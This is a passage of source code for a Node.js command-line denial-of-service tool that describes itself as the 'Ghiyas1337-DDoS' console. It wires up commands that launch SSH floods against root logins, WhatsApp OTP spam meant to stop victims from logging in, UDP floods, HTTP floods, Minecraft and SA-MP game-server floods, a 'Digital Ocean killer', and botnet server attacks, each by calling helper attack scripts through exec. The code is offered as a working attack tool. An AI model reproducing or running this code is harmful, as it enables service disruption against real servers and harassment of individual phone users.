\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m   ∆ Target Detail:
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - ISP: [ ${cyan}${result.isp}${Reset} ]
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - IP: [ ${cyan}${result.query}${Reset} ]
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m    - AS: [ ${cyan}${result.as}${Reset} ]
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m

</> Note: ${bold}${hijau}Please do not spam attack wait until this attack is over${Reset}
========================================================================
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
               OTP Killer Has Been Launched
               Type ${bold}${biru}"cls"${Reset} to clear terminal
========================================================================
Target   : ${target}
Duration : ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/Temp.js`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
               VPS Killer Has Been Launched
               Type ${bold}${biru}"cls"${Reset} to clear terminal
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw.js`);
const flood = path.join(__dirname, `/lib/cache/flood.js`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
           UDP Raw Flood Attack Launched
           Type ${bold}${biru}"cls"${Reset} to clear terminal
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`Example: .mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
           Minecraft Flood Attack Launched
           Type ${bold}${biru}"cls"${Reset} to clear terminal
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Minecraft Flooder
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}

const metode = path.join(__dirname, `/lib/cache/StarsXMc.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
                SAMP Flood Attack Launched
                Type ${bold}${biru}"cls"${Reset} to clear terminal
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : PermenMD`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/StarsXSamp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣿⣿⣿⣿⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢇⣀⠀⠀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡿⠿⠇⢀⡰⠋⣇⣀⣿⣿\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⡾⠿⢇⢀⣈⠉⢆⣀⡿⣿⡁⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⠿⢧⣀⡸⠌⢁⣠⣸⡿⠷⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢠⣶⣤⣴⡦⠀⠀⠀⠀⠠⣲⣾⠿⠿⣀⡸⠍⢡⣤⣼⡿⠿⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⢸⣿⣿⢿⣷⣲⣦⠀⣶⣺⠝⠛⣀⢤⠃⢠⣤⣼⠿⠣⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠺⠿⣿⣮⣟⠛⣻⣾⡟⠛⣤⣤⠓⢨⣤⣼⠿⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣿⣿⣯⠐⡛⠛⣧⣴⠓⠚⣦⣼⠛⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠙⠻⣷⣾⣶⢷⣾⣿⣶⣶⡿⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⣾⣿⣿⣻⣿⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⡀⣀⠀⣴⣿⡾⢩⢿⣿⣿⠛⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⡿⣽⣿⡏⠛⠋⠀⠉⠉⠙⢻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣟⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
                 Subdomains Finder
               Type ${bold}${biru}"cls"${Reset} to clear terminal
========================================================================
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
permen.question(`${back_putih}${teksmerah}Ghiyas DoS${Reset}➔ ${back_putih}${teksmerah}Chat AI${Reset}: `, async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By Ghiyas1337 & Coky1337

Thx To:
Allah SWT
ChatGPT ( Fixing Error )
PermenMD( Provide Base Script )
Azzam ( Provide Base Script )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
`
permen.question(`${back_putih}${teksmerah}Ghiyas1337-DDoS${Reset}➔ ${back_putih}${teksmerah}Console${Reset} ${back_putih}${teksmerah}►${Reset} `, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
| methods      | show list of available methods
| srvmenu      | show server menu
| track-ip     | track ip address with info
| subdo-finder | find all subdomain from domain
| kill-wifi    | kill your wifi (termux/linux/windows only)
| kill-ssh     | kill VPS Access 
| kill-otp     | kill WhatsApp OTP Verification
| kill-ping    | sending death pinger
| samp         | S.A.M.P Flooder
| mc-flood     | Minecraft Bot Flooder
| attack       | launch ddos attack
| udp-raw      | launch udp flood attack
| kill-do      | digital ocean killer
| ongoing      | show ongoing attack
| news         | show latest permenmd news
| credits      | show creator of these tools
| cls          | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[=========================================]
|| flood      || HTTP(s) Flood DoS
|| tls        || TLS 1.3 
|| strike     || Best DDoS methods
|| kill       || Bypass Cf DDoS methods
|| raw        || Huge RPS Flexing XD
|| bypass     || Bypass With High Power
|| thunder    || Massive Power Methods
|| storm      || The Raining Request
|| rape       || Bypass Protection
|| destroy    || Kill That Socket
|| slim       || Oh Is Fit There
|| quantum     || Bypass Protection
[=========================================]
`);
    sigma();
      } else if (command === 'srvmenu') {
    console.log(`
[=========================================]
|| srvattack  || Attack with Server
|| testsrv    ||  Checking Your Server
|| addsrv     || Add Server
[=========================================]
- Https (VIP)    || - Browser
- Strike         || - Vsebypass/Vseflood
- Bypass         || - Quantum
- Tls            || - Rape
- Ninja          || - Pidoras/pidoras2
- Mix            || - Storm
- Raw            || - Glory (VIP)
- Cibi           || - Xyn (VIP)
[=========================================]
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`Ghiyas Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'monitor') {
    monitorOngoingAttacks()
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
    } else if (command === 'addsrv') {
    processBotnetEndpoint(args)
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
  } else if (command === 'srvattack') {
    AttackBotnetEndpoints(args) 
  } else if (command === 'cls') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()